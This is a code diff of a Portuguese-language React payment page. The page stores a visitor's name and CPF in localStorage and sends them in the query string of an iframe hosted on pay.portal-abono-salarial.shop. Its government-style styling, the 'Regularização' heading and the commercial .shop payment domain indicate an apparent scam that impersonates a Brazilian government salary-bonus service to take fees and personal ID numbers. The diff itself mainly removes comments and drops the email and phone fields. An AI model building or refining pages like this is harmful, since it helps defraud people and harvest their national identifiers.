@@ -1,4 +1,3 @@
-
 import React, { useEffect, useState } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import { Button } from "@/components/ui/button";
@@ -18,10 +17,8 @@ const Payment: React.FC = () => {
   useEffect(() => {
     if (location.state && location.state.userData) {
       setUserData(location.state.userData);
-      // Store user data in localStorage
       localStorage.setItem("name", location.state.userData.nome || "");
       localStorage.setItem("cpf", location.state.userData.cpf || "");
-      // Default values for required fields that we might not have
       localStorage.setItem("email", localStorage.getItem("email") || "cliente@example.com");
       localStorage.setItem("phone", localStorage.getItem("phone") || "11999999999");
     } else {
@@ -32,9 +29,7 @@ const Payment: React.FC = () => {
 
   const formatCPF = (cpf: string) => {
     if (!cpf) return "";
-    // Remove any non-digit characters
     const digitsOnly = cpf.replace(/\D/g, '');
-    // Apply CPF mask XXX.XXX.XXX-XX
     return digitsOnly.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
   };
 
@@ -53,16 +48,13 @@ const Payment: React.FC = () => {
   };
 
   const openPaymentIframe = () => {
-    const email = localStorage.getItem("email") || "cliente@example.com";
     const name = localStorage.getItem("name") || userData?.nome || "";
-    const phone = localStorage.getItem("phone") || "11999999999";
     const cpf = localStorage.getItem("cpf") || userData?.cpf || "";
 
-    const url = `https://pay.portal-abono-salarial.shop/N1nVZpEdY60GlM6?email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&telephone=${encodeURIComponent(phone)}&document=${encodeURIComponent(cpf)}`;
+    const url = `https://pay.portal-abono-salarial.shop/N1nVZpEdY60GlM6?name=${encodeURIComponent(name)}&document=${encodeURIComponent(cpf)}`;
     
     setShowIframe(true);
     
-    // Small delay to ensure the iframe container is rendered before setting the src
     setTimeout(() => {
       const iframe = document.getElementById("pagamentoIframe") as HTMLIFrameElement;
       if (iframe) {
@@ -134,7 +126,6 @@ const Payment: React.FC = () => {
             Revisão de Dados para Regularização
           </h2>
 
-          {/* Informações Pessoais - Cartão compacto */}
           <Card className="mb-4 shadow-sm">
             <CardHeader className="pb-1 pt-3 px-4">
               <CardTitle className="text-sm flex items-center">
@@ -168,7 +159,6 @@ const Payment: React.FC = () => {
             </CardContent>
           </Card>
 
-          {/* Tabela de Detalhes compacta */}
           <div className="bg-white rounded-lg shadow-sm overflow-hidden mb-4">
             <div className="p-2 bg-govblue-50">
               <h3 className="font-medium text-govblue-700 text-sm flex items-center">
@@ -226,7 +216,6 @@ const Payment: React.FC = () => {
             </Table>
           </div>
 
-          {/* Aviso compacto */}
           <div className="p-2 bg-amber-50 border-l-4 border-amber-500 rounded-r-md mb-4 text-xs">
             <div className="flex items-start">
               <Clock className="h-4 w-4 text-amber-600 mt-0.5 mr-2 flex-shrink-0" />
@@ -236,7 +225,6 @@ const Payment: React.FC = () => {
             </div>
           </div>
 
-          {/* Botão de pagamento */}
           <div className="flex justify-center">
             <Button 
               className="gov-button bg-govblue-600 hover:bg-govblue-500 rounded-full px-4 py-2 text-sm w-full max-w-xs"
